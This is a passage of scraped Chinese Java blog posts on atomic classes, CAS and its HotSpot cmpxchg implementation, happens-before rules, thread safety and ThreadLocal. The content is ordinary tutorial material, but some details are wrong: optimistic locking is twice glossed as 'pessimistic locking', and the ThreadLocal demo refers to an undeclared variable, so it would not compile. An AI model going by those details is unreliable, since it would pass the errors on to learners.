中提供了对应的原子操作类来实现原子地且有条件进行的读-改-写操作操作。其本质是利用了 CPU 级别的原子指令。由于原子类是基于 CPU 级别的指令，因此其开销比需要操作系统参与的锁的开销小。 CAS 算法CAS （比较与交换，Compare and swap） 算法是一种非阻塞算法（non-blocking algorhithm），同时也是一种无锁算法（lock-free algorhithm），基于乐观锁（pessimistic locking）的思想。 非阻塞版本相对于基于锁的版本有几个性能优势。首先，它用硬件的原生形态代替 JVM 的锁定代码路径，从而在更细的粒度层次上（独立的内存位置）进行同步，失败的线程也可以立即重试，而不会被挂起后重新调度。更细的粒度降低了争用的机会，不用重新调度就能重试的能力也降低了争用的成本。即使有少量失败的 CAS 操作，这种方法仍然会比由于锁争用造成的重新调度快得多。 以 Atomic 类中的 incrementAndGet() 方法为例，其内部就调用了Unsafe中的 native 方法（CompareAndSet）以实现递增数值： 1234567891011121314151617private volatile int value;public final int get() &#123; return value; &#125;/** * Atomically increments by one the current value. * * @return the updated value */public final int incrementAndGet() &#123; for (;;) &#123; int current = get(); int next = current + 1; if (compareAndSet(current, next)) return next; &#125;&#125; 我们来分析下incrementAndGet的逻辑： 先获取当前的value值 对value加一 第三步是关键步骤，调用compareAndSet方法来进行一个原子更新操作，这个方法的语义是：先检查当前value是否等于current，如果相等，则意味着value没被其他线程修改过，更新并返回true。如果不相等，compareAndSet则会返回false，然后循环继续尝试更新。 AtomicInteger 例子比如，AtomicInteger 表示一个 int 类型的值，并提供了 get 和 set 方法，这些 Volatile 类型的 int变量在读取和写入上有着相同的内存语义。它还提供了一个原子的 compareAndSet 方法（如果该方法成功执行，那么将实现与读取/写入一个 volatile 变量相同的内存效果），以及原子地添加、递增和递减等方法。 AtomicInteger 的使用方法如下： 12345678AtomicInteger atomicInteger = new AtomicInteger();for(int b = 0; b &lt; numThreads; b++) &#123; new Thread(() -&gt; &#123; for(int a = 0; a &lt; iteration; a++) &#123; atomicInteger.incrementAndGet(); &#125; &#125;).start();&#125; 原子基本类型原子基本类型，从名称上就可以看出，是为基本类型提供原子操作的类。它们是以下3位： AtomicBoolean AtomicInteger AtomicLong 我们来看看 AtomicInteger 中的一些常用方法。 int getAndSet(int newValue)：以原子方式更新，并且返回旧值。 int getAndIncrement()：以原子方式自增，返回的是自增前的值。 int addAndGet(int delta)：以原子方式，将当前值与输入值相加，返回的是计算后的值。 原子数组下面的类是为数组中某个元素的更新提供原子操作的类。 AtomicIntegerArray AtomicLongArray AtomicReferenceArray 我们来看看 AtomicIntegerArray 中的一些常用方法： int getAndSet(int i, int newValue)：更新对应位置的值，返回更新前的值。 boolean compareAndSet(int i, int expect, int update)：比较对应位置的值与期望值，如果相等，则更新，返回true。如果不能返回false。 int getAndIncrement(int i)：对位置i的元素以原子方式自增，返回更新前的值。 int getAndAdd(int i, int delta)：对位置i的元素以原子方式计算，返回更新前的值。 原子引用类型如果我们只需要某个类里的某个字段，也就是说让普通的变量也享受原子操作，可以使用原子更新字段类，如在某些时候由于项目前期考虑不周全，项目需求又发生变化，使得某个类中的变量需要执行多线程操作，由于该变量多处使用，改动起来比较麻烦，而且原来使用的地方无需使用线程安全，只要求新场景需要使用时，可以借助原子更新器处理这种场景，Atomic并发包提供了以下三个类： AtomicReference AtomicReferenceFieldUpdater FieldUpdater方便以原子方式更新对象中的字段，字段不需要声明为原子变量，FieldUpdater是基于反射机制实现的。 AtomicMarkableReference 原子更新字段类前文提到了AtomicReferenceFieldUpdater类，它更新的是类的字段，除了这个类，Atomic还提供了另外三个类用于更新类中的字段： AtomicIntegerFieldUpdater AtomicLongFieldUpdater AtomicStampedReference Reference Java原子操作类，知多少？ - https://zhuanlan.zhihu.com/p/42908787 Java atomic原子类的使用方法和原理（一） - https://www.jianshu.com/p/a2f3c46d4783 非阻塞算法简介 - https://www.ibm.com/developerworks/cn/java/j-jtp04186/ Java并发编程-无锁CAS与Unsafe类及其并发包Atomic - https://juejin.im/entry/595c599e6fb9a06bc6042514 Java原子类实现原理分析 - https://www.cnblogs.com/chengxiao/p/6789109.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】锁 - CAS 无锁算法","date":"2019-02-27T13:16:26.000Z","path":"2019/02/27/【Java】锁-CAS无损算法/","text":"CAS（比较与交换，Compare and swap）CAS（比较与交换，Compare and swap） 算法是一种有名的非阻塞算法（non-blocking algorithm），同时也是一种无锁算法（lock-free algorithm），即在没有锁的情况下实现同步，基于乐观锁（pessimistic locking）的思想。 java.util.concurrent包中的原子类（比如 AtomicInteger）就是通过CAS来实现乐观锁的。 当多个线程尝试使用 CAS 同时更新同一个变量时，只有其中一个线程能成功地更新变量的值，而其它线程都失败，失败的线程并不会被挂起，而是被告知这次竞争中失败，并可以再次尝试。 CAS 无锁算法的 C 实现如下： 123456789int compare_and_swap (int* reg, int oldval, int newval) &#123; ATOMIC(); int old_reg_val = *reg; if (old_reg_val == oldval) *reg = newval; END_ATOMIC(); return old_reg_val;&#125; 由于 CAS 需要以原子操作的方式更新 *reg 的值，因此 CAS 需要硬件指令的支持。 就是指当两者进行比较时，如果相等，则证明共享数据没有被修改，因此可以替换成新值，然后继续往下运行；如果不相等，说明共享数据已经被修改，放弃已经所做的操作，然后重新执行刚才的操作。容易看出 CAS 操作是基于共享数据不会被修改的假设（即乐观锁思想），采用了类似于数据库的 commit-retry 的模式。当同步冲突出现的机会很少时，这种假设能带来较大的性能提升。 CAS 是怎么实现的以 Atomic 类中的 incrementAndGet() 方法为例，其内部就调用了Unsafe中的 native 方法（CompareAndSet）以实现递增数值： 1234567891011121314151617181920private volatile int value;public final int get() &#123; return value; &#125;/** * Atomically increments by one the current value. * * @return the updated value */public final int incrementAndGet() &#123; for (;;) &#123; int current = get(); int next = current + 1; if (compareAndSet(current, next)) return next; &#125;&#125;public final boolean compareAndSet(int expect, int update) &#123; return unsafe.compareAndSwapInt(this, valueOffset, expect, update);&#125; 我们来分析下incrementAndGet的逻辑： 先获取当前的value值 对value加一 第三步是关键步骤，调用compareAndSet方法来进行一个原子更新操作，这个方法的语义是：先检查当前value是否等于current，如果相等，则意味着value没被其他线程修改过，更新并返回true。如果不相等，compareAndSet则会返回false，然后循环继续尝试更新。 继续往下，就能发现unsafe对象其实是 sum.misc.Unsafe 这个类的单例实例。看名称 Unsafe 就是一个不安全的类，这个类是利用了 Java 的类和包在可见性的的规则中的一个恰到好处的漏洞。Unsafe 这个类为了速度，在Java的安全标准上做出了一定的妥协。 再往下寻找我们发现 Unsafe 类的 compareAndSwapInt() 方法是一个 Native 方法： 1public final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5); 也就是说，这几个 CAS 的方法应该是使用了本地的方法。所以这几个方法的具体实现需要我们自己去 JDK 的源码中搜索。 于是我下载一个 OpenJDK 的源码继续向下探索，我们发现在 /jdk9u/hotspot/src/share/vm/unsafe.cpp 中有这样的代码： 1&#123;CC &quot;compareAndSetInt&quot;, CC &quot;(&quot; OBJ &quot;J&quot;&quot;I&quot;&quot;I&quot;&quot;)Z&quot;, FN_PTR(Unsafe_CompareAndSetInt)&#125;, 这个涉及到，JNI 的调用，感兴趣的同学可以自行学习。我们搜索 Unsafe_CompareAndSetInt后发现: 123456UNSAFE_ENTRY(jboolean, Unsafe_CompareAndSetInt(JNIEnv *env, jobject unsafe, jobject obj, jlong offset, jint e, jint x)) &#123; oop p = JNIHandles::resolve(obj); jint* addr = (jint *)index_oop_from_field_offset_long(p, offset); return (jint)(Atomic::cmpxchg(x, addr, e)) == e;&#125; UNSAFE_END 最终我们终于看到了核心代码 Atomic::cmpxchg。 继续向底层探索，在文件java/jdk9u/hotspot/src/os_cpu/linux_x86/vm/atomic_linux_x86.hpp有这样的代码: 12345678inline jint Atomic::cmpxchg (jint exchange_value, volatile jint* dest, jint compare_value, cmpxchg_memory_order order) &#123; int mp = os::is_MP(); __asm__ volatile (LOCK_IF_MP(%4) \"cmpxchgl %1,(%3)\" : \"=a\" (exchange_value) : \"r\" (exchange_value), \"a\" (compare_value), \"r\" (dest), \"r\" (mp) : \"cc\", \"memory\"); return exchange_value;&#125; 我们通过文件名可以知道，针对不同的操作系统，JVM 对于 Atomic::cmpxchg 应该有不同的实现。由于我们服务基本都是使用的是64位linux，所以我们就看看linux_x86 的实现。 我们继续看代码： __asm__ 的意思是这个是一段内嵌汇编代码。也就是在 C 语言中使用汇编代码。 这里的 volatile和 JAVA 有一点类似，但不是为了内存的可见性，而是告诉编译器对访问该变量的代码就不再进行优化。 LOCK_IF_MP(%4) 的意思就比较简单，就是如果操作系统是多线程的，那就增加一个 LOCK。 cmpxchgl 就是汇编版的“比较并交换”。但是我们知道比较并交换，有三个步骤，不是原子的。所以在多核情况下加一个 LOCK，由CPU硬件保证他的原子性。 我们再看看 LOCK 是怎么实现的呢？我们去Intel的官网上看看，可以知道LOCK在的早期实现是直接将 CPU 的总线阻塞，这样的实现可见效率是很低下的。后来优化为 X86 CPU 有锁定一个特定内存地址的能力，当这个特定内存地址被锁定后，它就可以阻止其他的系统总线读取或修改这个内存地址。 关于 CAS 的底层探索我们就到此为止。我们总结一下 Java 的 CAS 是怎么实现的： Java 的 CAS 利用的的是 unsafe 这个类提供的 CASS 操作。 unsafe 的 CAS 依赖了的是 JVM 针对不同的操作系统实现的 Atomic::cmpxchg Atomic::cmpxchg 的实现使用了汇编的 CASS 操作，并使用 CPU 硬件提供的 lock 信号保证其原子性 CAS 的权衡在轻度到中度的争用情况下，非阻塞算法的性能会超越阻塞算法，因为 CAS 的多数时间都在第一次尝试时就成功，而发生争用时的开销也不涉及线程挂起和上下文切换，只多了几个循环迭代。没有争用的 CAS 要比没有争用的锁便宜得多（这句话肯定是真的，因为没有争用的锁涉及 CAS 加上额外的处理），而争用的 CAS 比争用的锁获取涉及更短的延迟。 在高度争用的情况下（即有多个线程不断争用一个内存位置的时候），基于锁的算法开始提供比非阻塞算法更好的吞吐率，因为当线程阻塞时，它就会停止争用，耐心地等候轮到自己，从而避免了进一步争用。但是，这么高的争用程度并不常见，因为多数时候，线程会把线程本地的计算与争用共享数据的操作分开，从而给其他线程使用共享数据的机会。 高并发环境下优化锁或无锁（lock-free）的设计思路服务端编程的3大性能杀手： 大量线程导致的线程切换开销。 锁。 非必要的内存拷贝。 在高并发下，对于纯内存操作来说，单线程是要比多线程快的。 可以比较一下多线程程序在压力测试下 CPU 的sy和ni百分比。高并发环境下要实现高吞吐量和线程安全，两个思路：一个是用优化的锁实现，一个是lock-free的无锁结构。但非阻塞算法要比基于锁的算法复杂得多。开发非阻塞算法是相当专业的训练，而且要证明算法的正确也极为困难，不仅和具体的目标机器平台和编译器相关，而且需要复杂的技巧和严格的测试。 虽然 lock-Free 编程非常困难，但是它通常可以带来比基于锁编程更高的吞吐量。所以 lock-Free 编程是大有前途的技术。它在线程中止、优先级倒置以及信号安全等方面都有着良好的表现。 ABA问题使用CAS方式更新有一个ABA问题，该问题是指，一个线程开始看到的值是A，随后使用CAS进行更新，它的实际期望是没有其他线程修改过才更新，但普通的CAS做不到，因为可能在这个过程中，已经有其他线程修改过了，比如先改为了B，然后又改回为了A。 一个通常的解决 ABA 问题的思路是增加时间戳，即在进行数据更新时，不仅仅对比当前值与开始操作之前的值是不是一致，还对比最后修改数据的时间戳是否一致。 CAS 算法在 JDK中的应用java.util.concurrent.atomic 中的 AtomicXXX ，都使用了这些底层的 JVM 支持为数字类型的引用类型提供一种高效的 CAS 操作，而在java.util.concurrent 中的大多数类在实现时都直接或间接的使用了这些原子变量类，这些原子变量都调用了 sun.misc.Unsafe 类库里面的 CAS 算法，用 CPU 指令来实现无锁自增。 在java.util.concurrent.atomics.AtomicInteger中就使用和提供了很多CAS方法。如下面的方法，比较当前AtomicInteger的值，如果等于expect则并交换成update, 整体是一个原子方法，如果当前值是1并且有其他线程同时在执行compareAndSet(1, 2)，则只有一个能够执行成功。 123public final boolean compareAndSet(int expect, int update) &#123; return unsafe.compareAndSwapInt(this, valueOffset, expect, update);&#125; Reference 非阻塞同步算法与CAS(Compare and Swap)无锁算法 - https://www.cnblogs.com/Mainz/p/3546347.html JAVA 中的 CAS - https://juejin.im/post/5a75db20f265da4e826320a9","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - Happens-before 原则","date":"2019-02-27T07:32:20.000Z","path":"2019/02/27/【Java】多线程-happens-before-原则/","text":"除了从应用层面保证目标代码段执行的有序性（Ordering）外，JVM 还通过被称为 happens-before 原则隐式地保证单线程执行的有序性。 先行发生原则（Happens-before 原则）先行发生原则（happens-before 原则）非常重要，它是判断数据是否存在竞争、线程是否安全的主要依据，依靠这个原则，我们可以解决在并发环境下，两操作之间是否可能存在冲突的所有问题。 先行发生（happens-before）是 Java 内存模型中定义的两项操作之间的偏序关系（partial order），如果线程 A 执行的操作 A 先行发生于线程 B 中执行的操作 B，那么操作 A 产生的影响能够被操作 B 观察到。“影响”包括修改了内存中的共享变量的值、发送了消息、调用了方法等。 例子举个例子： 123456///以下操作在线程A中执行i = 1;//以下操作在线程B中执行j = i;//以下操作在线程C中执行i = 2; 假设线程 A 中的操作 i=1 先行发生于线程 B 的操作 j=i ，那么就可以确定在线程 B 的操作执行后，j 一定等于 1 。因为，根据先行发生原则，i=1 的结果可以被线程 B 观察到。 现在保持线程 A 先行发生于线程 B，假设线程 C 的执行发生在 A 与 B 之间，但是线程 C 与 B 没有先行发生关系。那么 j 会等于多少呢？ 答案是不确定。因为线程 C 对变量 i 的影响可能会被 B 观察到，也可能不会。换句话说，对于多线程执行的情况，一个线程最先被执行，但这并不意味着这个线程执行的结果能后后执行的线程锁观察到。 本质上，是因为两者之间没有先行发生关系。这时候线程 B 就存在读取到过期数据的风险，因而不具备多线程安全性。 总结总结来说，多线程之间的执行在时间上具有先后执行顺序，并不意味着先执行线程的执行结果能够被后执行线程所观察到（因此存在变量的可见性问题）。 Happens-before规则的直接作用是约束指令重排序，从而保证同步，确定了线程的安全性。 ”天然的“ Happens-before关系Happens-before是JMM中定义两项操作的偏序关系，如果操作A和操作B满足Happens-before，比如操作A先行发生于操作B，那么操作B一定能看到操作A的影响。 如果仅靠synchronized和volatile来保证Java内存模型的有序性，那么我们日常代码的实现将无法想象。下面是JMM中天然的Happens-before关系，这些先行发生关系无需任何同步器协助就已经存在： 程序次序规则（Program Order Rule） ：一个线程内，按照代码顺序，书写在前面的操作，先行发生于（happens-before）书写在后面的操作。 管程锁定规则（Monitor Lock Rule）：一个管程（monitor）上的 unLock 操作，先行发生于（happens-before）后面对同一个管程的 lock 操作。 volatile 变量规则（volatile Variable Rule）：对一个 volatile 变量的写操作，先行发生于（happens-before）后面对这个变量的读操作。 传递规则（Transitivity） ：如果操作A先行发生于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C。 线程启动规则（Thread Start Rule） Thread对象的start()方法，先行发生于（happens-before）此线程的每一个动作。 线程终止规则（Thread Termination Rule） 线程中的所有操作，都先行发生于（happens-before）对此线程的终止检测。 线程中断规则（Thread Interruption Rule） 对线程interrupt()方法的调用，先行发生于（happens-before）被中断线程的代码检测到中断事件的发生，可以通过Thread.interrupt()方法检测到是否有中断发生。 对象终结规则（Finalizer Rule） 一个对象的初始化完成（构造函数执行结束），先行发生于（happens-before）它的finalize()方法的开始。 Java语言无须任何同步手段保障，就能成立的先行发生规则，就只有上面这些了。 如果两个操作之间的关系不在此列，或者无法从上列规则推导出来的话，它们就没有顺序性保障，换句话说，虚拟机可以对它们进行随意地重排序。 程序次序规则（Program Order Rule）对于程序次序规则（Program Order Rule） 来说，就是一段程序代码的执行，在单个线程中看起来是有序的。 注意，虽然这条规则中提到“书写在前面的操作先行发生于书写在后面的操作”，这个应该是程序看起来执行的顺序是按照代码顺序执行的，因为虚拟机可能会对程序代码进行指令重排序。 虽然进行重排序，但是最终执行的结果是与程序顺序执行的结果一致的，因为JVM只会对不存在数据依赖性的指令进行重排序。 管程锁定规则（Monitor Lock Rule）如果想保证执行操作B的线程看到操作A的结果（无论A和B是否在同一个线程中执行），那么A和B之间必须满足 Happens-Before 关系。如果两个操作之间缺乏 Happens-Before 关系，那么JVM可以对它们任意地重排序。举一个简单的例子，当两个线程使用同一个锁进行同步时，它们之间的 Happens-Before 关系如下： 总结单线程对于不存在数据依赖的两个操作，如果能基于上述规则推导出某两个操作之间具有“先行发生”关系，则JVM会保证这两个操作执行上的先后顺序（而不会进行指令重排序）。 对于存在数据依赖的两个操作，由于天然地不会进行指令重排序，因此自然也具有“先行发生”关系，因而JVM也会保证这两个操作执行上的先后顺序。 多线程当两个操作执行时具有时间上的先后执行顺序时，而且能基于上述规则推导出某两个操作之间具有“先行发生”关系，则才能保证先执行操作的可见性。 “时间上的先后顺序”与“先行发生”之间的区别以下示例将会演示如何使用这些规则去判定操作间是否具有顺序性，对于读写共享变量的操作来说，就是线程是否安全。 我们还可以从下面这个例子，感受一下“时间上的先后顺序”与“先行发生”之间有什么不同。 123456789private int value = 0;public void setValue(int value)&#123; this.value = value;&#125;public int getValue()&#123; return value;&#125; 代码清单演示的是一组再普通不过的getter/setter方法，假设存在线程A和B，线程A先（时间上的先后）调用了setValue(1)，然后线程B调用了同一个对象的getValue()，那么线程B收到的返回值是什么？ 分析依次分析一下先生发生原则中的各项规则： 由于两个方法分别由线程A和线程B调用，不在一个线程中，所以程序次序规则在这里不适用； 由于没有同步块，自然就不会发生lock和unlock操作，所以管程锁定规则在这里也不适用； 由于value变量没有被volatile关键字修饰，所以volatile变量规则不适用； 后面的线程启动、终止、中断规则和对象终结规则也和这里完全没有关系； 因为没有一个适用的先行发生规则，所以最后一条传递性也无从谈起。 因此我们可以判定尽管线程A在操作时间上先于线程B，但是无法确定线程B中的getValue()方法的返回结果，换句话说，这里面的操作不是线程安全的。 修复至少有两种比较简单的方案可以修复这个问题： 把getter/setter方法都定义为synchronized方法，这样就可以套用管程锁定规则； 把value定义为volatile变量，由于setter方法对value的修改不依赖value的原值，满足volalite关键字的使用场景，这样就可以套用volatile变量规则。 结论通过上面的例子，我们可以得出结论： 一个操作“时间上的先发生”不代表这个操作会是“先行发生”，同样一个操作“先行发生”也不能推导出这个操作必定是“时间上的先发生”，一个典型的例子就是指令重排序。 123// 以下操作在同一个线程中执行i ＝ 1;j ＝ 2; 如上代码清单所示，两条赋值语句在同一个线程中执行，根据次序规则，“int i ＝ 1”的操作先行发生于“int j ＝ 2”，但是“int j ＝ 2”的代码完成可能先被处理器执行，这并不影响先行发生规则的正确性，因为我们在这条线程之中没有办法感知到这点。 综上所述： 时间先后顺序与先行发生原则之间基本没有太大的关系，所以我们衡量并发安全问题的时候不要受到时间顺序的干扰，一切必须以先行发生原则为准。 Reference 《深入理解Java虚拟机》 先行发生原则（happens-before） - https://www.jianshu.com/p/817c66f5b2d3 深入理解JVM之先行发生关系（四） - http://zouzls.github.io/2017/02/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM%E4%B9%8B%E5%85%88%E8%A1%8C%E5%8F%91%E7%94%9F%E5%8E%9F%E5%88%99%EF%BC%88%E5%9B%9B%EF%BC%89/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - 线程安全（Thread Safety）","date":"2019-02-27T07:01:44.000Z","path":"2019/02/27/【Java】多线程-线程安全/","text":"背景线程安全是多线程领域的问题，线程安全可以简单理解为一个方法或者一个实例可以在多线程环境中使用而不会出现问题。 产生线程不安全的原因在同一程序中运行多个线程本身不会导致问题，问题在于多个线程访问了相同的资源。如，同一内存区（变量，数组，或对象）、系统（数据库，web services等）或文件。实际上，这些问题只有在一或多个线程同时向这些资源进行写操作时，才可能发生。 只要资源没有发生变化，多个线程读取相同的资源仍然是安全的。 竞态条件（Race condition） &amp; 临界区（Critical Regions）当两个线程同时修改同一资源时，就存在竞态条件（Race condition） 。导致竞态条件发生的代码区称作临界区（Critical Regions）。 通过在临界区中使用适当的同步机制（synchronization），比如互斥锁（mutex），就可以避免竞态条件。 线程安全（Thread Safety） 当一个可变（mutable）对象会被多个线程访问时，就要考虑这个线程是不是需要被设计成线程安全的。 一个类会被称为线程安全（thread-safe）的，当它被从多个线程访问，而且无论这些线程如何被调度（scheduling）和交叉（interleaving）执行，而且在调用代码（calling code）中不需要额外的同步（synchronization）或者其他协调（coordiantion）机制，它的行为仍然正确（若预期执行）。 换句话说，线程安全的类封装（encapsulate）了已经需要的同步机制，因此客户端或者说调用者不再需要关注或者提供这些同步机制。 不同场景的线程安全讨论基础类型的局部变量局部变量存储在线程自己的栈中。也就是说，局部变量永远也不会被多个线程共享。所以，基础类型的局部变量是线程安全的。下面是基础类型的局部变量的一个例子： 1234public void someMethod()&#123; int threadSafeInt = 0; threadSafeInt++;&#125; 引用类型的局部变量引用类型的局部变量和基础类型的局部变量情况不同。 尽管引用本身（本质上是一个指向堆空间的指针）没有被共享，但引用所指的对象并没有存储在线程的栈内，而是存在该线程所属的进程中的堆（Heap）里。注意，该进程的所有子线程均可以访问这个。所以，对于引用类型的局部变量，有可能是线程安全的，也有可能是线程不安全的。 那么怎样才是线程安全的呢？如果在某个方法中创建的对象（及它的成员变量）不会被其他线程访问到，那么它就是线程安全的。本质上，是因为不存在该对象被多个线程同时读写的情况（因为只能被一个线程访问）。 下面是一个线程安全的局部引用样例： 123456789public void someMethod()&#123; LocalObject localObject = new LocalObject(); localObject.callMethod(); method2(localObject);&#125;public void method2(LocalObject localObject)&#123; localObject.setValue(\"value\");&#125; 上面样例中，每个执行 someMethod() 的线程都会创建自己的 LocalObject 对象，并赋值给 localObject 引用。因此，这里的 LocalObject 是线程安全的。事实上，整个 someMethod() 都是线程安全的。即使将 LocalObject 作为参数传给同一个类的其它方法或其它类的方法时，它仍然是线程安全的。 当然，如果 LocalObject 通过某些方法被传给了别的线程，那它就不再是线程安全的了。 不可变（immutable）的共享资源当多个线程同时访问同一个资源，并且其中的一个或者多个线程对这个资源进行了写操作，才会产生竞态条件。但是，如果多个线程同时读取同一个资源，并不会产生竞态条件。 因此，我们可以通过创建不可变（immutable）的共享对象来保证对象在线程间共享时不会被修改，从而实现线程安全。 如下示例： 1234567891011public class ImmutableValue&#123; private int value = 0; public ImmutableValue(int value)&#123; this.value = value; &#125; public int getValue()&#123; return this.value; &#125;&#125; 类库中大多数基本数值类如 Integer、String 和 BigInteger 都是不可变的。 final 关键字Java 中，如果共享数据是一个基本数据类型，那么只要在定义时使用 final 关键字修饰它，就可以保证它是不可变的。 如果共享数据是一个对象，那就需要保证对象的行为不会对其状态产生任何影响才行。如java.lang.String类的对象，它是典型的不可变对象，调用它的API 不会影响原来的值，只会返回一个新构建的对象。 保证对象行为不影响自己状态的途径有很多种，其中最简单的就是把对象中带有状态的变量都声明为final。 例如如下面 java.lang.Integer 构造函数所示的，它通过将内部状态变量value定义为final来保障状态不变： 1234567891011121314151617/** * The value of the &#123;@code Integer&#125;. * * @serial */ private final int value; /** * Constructs a newly allocated &#123;@code Integer&#125; object that * represents the specified &#123;@code int&#125; value. * * @param value the value to be represented by the * &#123;@code Integer&#125; object. */ public Integer(int value) &#123; this.value = value; &#125; 在 Java API 中符合不可变要求的类型，除了上面提到的 String 之外，常用的还有枚举类型，以及 java.lang.Number 的部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型；但同为 Number 的子类型的原子类 AtomicInteger 和 AtomicLong 则并非不可变的。 总结反过来，当多个线程可以同时访问一个可变状态（mutable state）变量，且没有同步机制时，这个程序就会有 bug，我们通过以下任何一种方式解决： 不要在线程之间共享状态变量（state variable）； 使得状态变量的状态不可改变（immutable）； 增加同步机制，比如互斥锁（mutexes）。 绝对线程安全绝对的线程安全完全满足 Brian GoetZ 给出的线程安全的定义，这个定义其实是很严格的，一个类要达到“不管运行时环境如何，调用者都不需要任何额外的同步措施”通常需要付出很大的代价。在 Java API 中标注自己是线程安全的类，大多数都不是绝对的线程安全。我们可以通过 Java API 中一个不是“绝对线程安全”的线程安全类来看看这里的“绝对”是什么意思。 如果说 java.util.Vector 是一个线程安全的容器，相信所有的 Java 程序员对此都不会有异议，因为它的 add()、get() 和 size() 这类方法都是被 synchronized 修饰的，尽管这样效率很低，但确实是安全的。 但是，即使它所有的方法都被修饰成同步，也不意味着调用它的时候永远都不再需要同步手段了。 Java 中实现线程安全的方法在 Java 多线程编程当中，Java 本身提供了多种实现线程安全的方式： 最简单的方式，使用 synchronized 关键字来引入互斥锁（mutexes）来保证互斥访问（mutual exclusion），互斥锁是一种悲观锁（pessimistic locking）； 使用 java.util.concurrent.locks 包中的锁，它们同样也是互斥锁（mutexes）； 使用信号量（Semaphore）； 对于共享变量为基本数据类型时，可使用 java.util.concurrent.atomic 包中的原子类（atomic classes），例如 AtomicInteger； 使用线程安全的集合，比如ConcurrentHashMap； 当只需要保证变量可见性（而不需要保证原子性时），使用 volatile 关键字，volatile 关键字并不是一种锁机制，因而效率相对比锁要高。 Reference 《深入理解Java虚拟机》 什么是线程安全 - https://blog.csdn.net/suifeng3051/article/details/52164267 什么是线程安全？ - https://www.jianshu.com/p/44831d1d10d3","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程 - ThreadLocal","date":"2019-02-27T02:40:01.000Z","path":"2019/02/27/【Java】多线程-ThreadLocal/","text":"ThreadLocal 类通常情况下，我们创建的非局部变量是可以被任何一个线程访问并修改的。而使用 ThreadLocal 创建的变量只能被当前线程访问，其他线程则无法访问和修改。 ThreadLocal 类允许我们创建一个共享变量（这个变量可以被多个线程访问），但是这个共享变量的值包含多个副本，每个副本对应一个线程（且这个副本只能被同一个线程读写的）。因此，如果一段代码含有一个ThreadLocal变量的引用，即使两个线程同时执行这段代码，它们也无法访问到对方的 ThreadLocal 变量的值。 ThreadLoal 变量，它的基本原理是，同一个 ThreadLocal 所包含的对象，在不同的 Thread 中有不同的副本（实际是不同的实例）。这里有几点需要注意： 因为每个 Thread 内有自己的实例副本，且该副本只能由当前 Thread 使用。这是也是 ThreadLocal 命名的由来 既然每个 Thread 有自己的实例副本，且其它 Thread 不可访问，那就不存在多线程间共享的问题 Demo1234567891011121314151617181920212223public class ThreadLocalTest1 &#123; public static class MyRunnable implements Runnable &#123; private ThreadLocal&lt;Integer&gt; v = new ThreadLocal&lt;Integer&gt;(); @Override public void run() &#123; threadLocal.set((int) (Math.random() * 100D)); try&#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; &#125; System.out.println(threadLocal.get()); System.out.println(threadLocal.hashCode()); System.out.println(\"-------\"); &#125; &#125; public static void main(String[] args) &#123; Thread t1 = new Thread(new MyRunnable(), \"A\"); Thread t2 = new Thread(new MyRunnable(), \"B\"); t1.start(); t2.start(); &#125;&#125; 运行结果12345626907247395-------67907247395------- 分析即：线程A与线程B在 ThreadLocal 共享实例中保存的整型变量是各自独立的，互不相干，只要在每个线程内部使用 set 方法赋值，然后在线程内部使用 get 方法就能取到对应的值。 由于在不同线程中 ThreadLocal 实例的 hashCode 是相同的，说明不同线程访问的均是同一个 ThreadLocal 实例。 ThreadLocal 原理既然每个访问 ThreadLocal 变量的线程都有自己的一个“本地”实例副本。一个可能的方案是 ThreadLocal 维护一个 Map，键是 Thread，值是它在该 Thread 内的实例。线程通过该 ThreadLocal 的 get() 方案获取实例时，只需要以线程为键，从 Map 中找出对应的实例即可。该方案如下图所示： 该方案可满足上文提到的每个线程内一个独立备份的要求。每个新线程访问该 ThreadLocal 时，需要向 Map 中添加一个映射，而每个线程结束时，应该清除该映射。这里就有两个问题： 增加线程与减少线程均需要写 Map，故需保证该 Map 线程安全。虽然从ConcurrentHashMap的演进看Java多线程核心技术一文介绍了几种实现线程安全 Map 的方式，但它或多或少都需要锁来保证线程的安全性。 线程结束时，需要保证它所访问的所有 ThreadLocal 中对应的映射均删除，否则可能会引起内存泄漏。 如何创建ThreadLocal变量以下代码展示了如何创建一个 ThreadLocal 变量： 1private ThreadLocal myThreadLocal = new ThreadLocal(); 我们可以看到，通过这段代码实例化了一个 ThreadLocal 对象。我们只需要实例化对象一次，并且也不需要知道它是被哪个线程实例化。虽然所有的线程都能访问到这个 ThreadLocal 实例，但是每个线程却只能访问到自己通过调用 ThreadLocal 的 set() 方法设置的值。即使是两个不同的线程在同一个 ThreadLocal 对象上设置了不同的值，他们仍然无法访问到对方的值。 如何访问ThreadLocal变量一旦创建了一个ThreadLocal变量，你可以通过如下代码设置某个需要保存的值： 1myThreadLocal.set(\"A thread local value”); 可以通过下面方法读取保存在ThreadLocal变量中的值： 1String threadLocalValue = (String) myThreadLocal.get(); get() 方法返回一个 Object 对象，set() 对象需要传入一个 Object 类型的参数。 为ThreadLocal指定泛型类型我们可以创建一个指定泛型类型的 ThreadLocal 对象，这样我们就不需要每次对使用 get() 方法返回的值作强制类型转换了。下面展示了指定泛型类型的 ThreadLocal 例子： 1private ThreadLocal myThreadLocal = new ThreadLocal&lt;String&gt;(); 现在我们只能往 ThreadLocal 对象中存入 String 类型的值了。并且我们从 ThreadLocal 中获取值的时候也不需要强制类型转换了。 如何初始化ThreadLocal变量的值由于在 ThreadLocal 对象中设置的值只能被设置这个值的线程访问到，线程无法在 ThreadLocal 对象上使用 set() 方法保存一个初始值，并且这个初始值能被所有线程访问到。 但是，我们可以通过创建一个 